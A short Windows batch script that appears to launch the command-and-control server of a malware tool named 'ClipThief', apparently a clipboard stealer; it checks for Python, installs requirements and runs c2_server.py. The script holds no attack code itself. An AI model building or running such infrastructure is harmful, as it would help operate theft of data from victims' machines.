@echo off
title ClipThief C2 Server

:: Check Python
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] Python not found. Install Python 3.8+ and add to PATH.
    pause & exit /b 1
)

:: Install deps if needed
echo [*] Checking dependencies...
pip install -r requirements.txt -q

echo.
echo [*] Starting C2 Server...
echo.
python c2_server.py %*
pause
